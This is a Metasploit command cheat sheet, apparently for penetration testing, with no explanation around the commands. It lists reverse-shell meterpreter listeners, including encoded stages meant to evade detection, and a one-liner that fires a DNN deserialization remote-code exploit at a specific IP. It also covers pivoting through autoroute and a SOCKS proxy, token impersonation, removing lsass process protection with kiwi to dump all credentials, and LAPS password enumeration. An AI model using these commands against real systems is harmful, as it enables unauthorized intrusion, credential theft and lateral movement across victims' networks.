# msfconsole

% metasploit

## listener -  windows tcp meterpreter
```bash
msfconsole -x "use multi/handler ; set payload windows/meterpreter/reverse_tcp ;  set exitonsession false ;  set LHOST <interface> ;  set LPORT <port>; run -j"
```

## listener -  windows tcp 32bits staged
```bash
msfconsole -x "use exploits/multi/handler; set lhost <ip>; set lport <port>; set payload windows/meterpreter/reverse_tcp; exploit"
```

## listener -  windows https 32bits staged
```bash
msfconsole -x "use exploits/multi/handler; set lhost <ip>; set lport <port|443>; set payload windows/meterpreter/reverse_https; set EXITFUNC thread; exploit
```

## listener -  windows https 64bits staged
```bash
msfconsole -x "use exploits/multi/handler; set lhost <ip>; set lport <port|443>; set payload windows/x64/meterpreter/reverse_https; exploit"
```

## listener -  https 64bits unstaged
```bash
msfconsole -x "use exploits/multi/handler; set lhost <ip>; set lport <port|443>; set payload windows/x64/meterpreter_reverse_https; exploit"
```

## listener -  https 64bits stagged - encoded xor
others encoder : x64/zutto_dekiru
```bash
msfconsole -x "use exploits/multi/handler; set lhost <ip>; set lport <port|443>; set payload windows/x64/meterpreter/reverse_https; set EXITFUNC thread; set EnableStageEncoding true; set StageEncoder <encoder|x64/xor_dynamic>; exploit"
```

## listener -  linux tcp 64bits stagged - encoded xor
```bash
msfconsole -x "use exploits/multi/handler; set lhost <ip|tun0>; set lport <lport|443>; set payload windows/x64/meterpreter/reverse_https; set EXITFUNC thread; set EnableStageEncoding true; set StageEncoder x64/xor_dynamic; exploit"
```



## recon - local_exploit_suggester
```bash
use post/multi/recon/local_exploit_suggester
```

## oneliner
```bash
msfconsole -q -x 'setg LHOST=tun0;use windows/http/dnn_cookie_deserialization_rce;set LHOST 10.10.16.179; set RHOSTS 10.10.110.10; set RPORT 80;run'
```


## meterpreter - upgrade to 
```bash
sessions -u <session_id>
```

## show session list
#plateform/linux #target/remote #cat/ATTACK/CONNECT
```bash
sessions -l
```

## print route table
#plateform/linux #target/remote #cat/PIVOT/TUNNEL-PORTFW 
```
route print
```

## add pivot (autoroute)
#plateform/linux #target/remote #cat/PIVOT/TUNNEL-PORTFW 
example : 
use multi/manage/autoroute
set session 1
exploit
```
use multi/manage/autoroute
```

## add socks proxy (autoroute first)
#plateform/linux #target/remote #cat/PIVOT/TUNNEL-PORTFW 

example : 
use multi/manage/autoroute
set session 1
exploit
use auxiliary/server/socks_proxy
set srvhost 127.0.0.1
exploit -j

```
use auxiliary/server/socks_proxy
```

## load incognito 
#plateform/linux #target/local #cat/PRIVESC  
```
load incognito
```

## incognito impersonate token
#plateform/linux #target/local #cat/PRIVESC  
```
impersonate_token <domain_fqdn>\\<user>
```
## create process
#plateform/linux #target/local #cat/UTILS 
```
execute -H -f <process|notepad>
```

## migrate with name
#plateform/linux #target/local #cat/ATTACK/INJECTION 
```
migrate -N <process_name|notepad.exe>
```

##  PPL remove
#plateform/linux #target/local #cat/ATTACK/INJECTION 
```
load kiwi
kiwi_cmd "!processprotect /process:lsass.exe /remove"
creds_all
```

## enum LAPS
#plateform/linux #target/local #cat/ATTACK
```
use post/windows/gather/credentials/enum_laps
```

